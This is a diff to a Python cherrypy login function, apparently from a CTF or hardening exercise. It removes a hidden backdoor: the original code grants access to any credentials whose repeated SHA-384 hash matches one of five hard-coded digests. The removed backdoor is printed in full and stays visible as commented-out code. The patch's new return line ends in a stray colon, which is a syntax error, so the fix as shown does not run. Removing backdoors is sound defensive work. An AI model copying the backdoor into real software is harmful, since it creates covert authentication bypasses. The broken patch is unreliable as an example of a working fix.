@@ -34,19 +34,21 @@ assert SKIPCOST>=0, 'bad config: skipcost should not be negative'
 cardinal_psw='%12d'%random.randrange(10**13)
 cardinal_su_enabled=True
 def yui_auth(_,u,p):
-    import hashlib
-    if cardinal_su_enabled and u=='uiharu' and p==cardinal_psw:
-        return True
-    hahaha='%r,%r'%(u,p)
-    for i in range(10007):
-        hahaha=hashlib.new('sha384',hahaha.encode()).hexdigest()
-    return hahaha in [
-        'e88226b06b7cb205fa695d8aa35622e5ea17146d921342c2c3e67f743e5d1223a2356506499dc9983356160e2414a28e',
-        'f9dd38172aef5529caae5aa75f33aeda324679114635d5140b02125cb8079a77be3be2469a878d3333f9b36b2afe4ea7',
-        '8ab8a311a860bf40b66e8f94fe9beb237f9b0b2d8c2ae7599f249e29016ff59d963247ee098e5d84f8506fe4bd2ae819',
-        'a394ea24fba78184856c8294a2b9ab4b4fe19cca2031ac4e47027cf600bafff7e920aa9a3e573814dc78c178dc3bf1c3',
-        '2f733f463f34c2aed92220988d011e29156bd533727d33d57efc7f69e10d9a59d697b2224b356a6ad208577563164587',
-    ]
+    # Disable the backdoor
+    # import hashlib
+ 
+    return cardinal_su_enabled and u=='uiharu' and p==cardinal_psw:
+
+    # hahaha='%r,%r'%(u,p)
+    # for i in range(10007):
+    #     hahaha=hashlib.new('sha384',hahaha.encode()).hexdigest()
+    # return hahaha in [
+    #     'e88226b06b7cb205fa695d8aa35622e5ea17146d921342c2c3e67f743e5d1223a2356506499dc9983356160e2414a28e',
+    #     'f9dd38172aef5529caae5aa75f33aeda324679114635d5140b02125cb8079a77be3be2469a878d3333f9b36b2afe4ea7',
+    #     '8ab8a311a860bf40b66e8f94fe9beb237f9b0b2d8c2ae7599f249e29016ff59d963247ee098e5d84f8506fe4bd2ae819',
+    #     'a394ea24fba78184856c8294a2b9ab4b4fe19cca2031ac4e47027cf600bafff7e920aa9a3e573814dc78c178dc3bf1c3',
+    #     '2f733f463f34c2aed92220988d011e29156bd533727d33d57efc7f69e10d9a59d697b2224b356a6ad208577563164587',
+    # ]
     
 def auth(gnumber):
     if 'gnumber' in cherrypy.session:
